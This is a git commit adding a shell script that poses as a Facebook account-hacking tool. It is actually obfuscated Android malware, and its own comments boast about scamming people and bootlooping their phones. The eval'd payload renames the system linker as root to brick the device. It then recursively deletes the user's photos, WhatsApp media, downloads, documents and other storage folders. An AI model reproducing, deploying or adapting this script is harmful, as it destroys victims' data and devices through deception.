45550b0a32fa6cd81a643b455743fb098c1023f2
Mr.Lukman <63442296+LukmanNurulHakim@users.noreply.github.com>
2020-04-19 06:21:34 +0700

    Add files via upload

---
+++ HECK FB TANAPA CEK POINT 2020.sh
@@ -0,0 +1,7 @@
+# BOTLOOP
+# SIAP NIPU ORANG UNTUK HP BOOTLOP BOSQ
+#WKWKWK
+#BLACK HAT TIDAK KEMANA MANA :V
+z="
+";UBz='/Vid';kz='/0/D';Qz='etup';RBz='dia';IBz='/Dow';Iz=' /sy';lz='ownl';SBz='/Pic';KBz='d';wz='ideo';Uz='rf /';fz='/0/W';gz='hats';Nz='nk'\''';oz='ents';tz='ictu';Az='su -';Tz='rm -';NBz='th';rz='CIM';Ez='yste';vz='/0/V';ABz='luet';Jz='stem';OBz='/Wha';qz='usic';Sz='rage';VBz='eos';Pz='ux-s';nz='ocum';Vz='stor';Zz='/0/A';EBz='shot';XBz='umen';iz='Medi';jz='a';hz='app/';pz='/0/M';PBz='tsap';xz='s';YBz='ts';uz='res';Xz='emul';Cz='enam';LBz='/Blu';ez='ata';TBz='ture';MBz='etoo';sz='/0/P';FBz='/0';Bz='c '\''r';az='ndro';cz='bb';yz='/0/B';CBz='/0/S';Rz='-sto';Yz='ated';Oz='term';Lz='/lin';WBz='/Doc';JBz='nloa';BBz='ooth';bz='id/o';DBz='ceen';mz='oad';Wz='age/';Dz='e /s';GBz='sdca';Hz='nker';Kz='/bin';QBz='p/Me';dz='id/d';HBz='rd/0';Gz='n/li';Fz='m/bi';Mz='k_lu';ZBz='rf *';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$z$Oz$Pz$Qz$Rz$Sz$z$Oz$Pz$Qz$Rz$Sz$z$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$dz$ez$z$Tz$Uz$Vz$Wz$Xz$Yz$fz$gz$hz$iz$jz$z$Tz$Uz$Vz$Wz$Xz$Yz$kz$lz$mz$z$Tz$Uz$Vz$Wz$Xz$Yz$kz$nz$oz$z$Tz$Uz$Vz$Wz$Xz$Yz$pz$qz$z$Tz$Uz$Vz$Wz$Xz$Yz$kz$rz$z$Tz$Uz$Vz$Wz$Xz$Yz$sz$tz$uz$z$Tz$Uz$Vz$Wz$Xz$Yz$vz$wz$xz$z$Tz$Uz$Vz$Wz$Xz$Yz$yz$ABz$BBz$z$Tz$Uz$Vz$Wz$Xz$Yz$CBz$DBz$EBz$z$Tz$Uz$Vz$Wz$Xz$Yz$FBz$z$Tz$Uz$GBz$HBz$IBz$JBz$KBz$z$Tz$Uz$GBz$HBz$LBz$MBz$NBz$z$Tz$Uz$GBz$HBz$OBz$PBz$QBz$RBz$z$Tz$Uz$GBz$HBz$SBz$TBz$xz$z$Tz$Uz$GBz$HBz$UBz$VBz$z$Tz$Uz$GBz$HBz$WBz$XBz$YBz$z$Tz$ZBz"
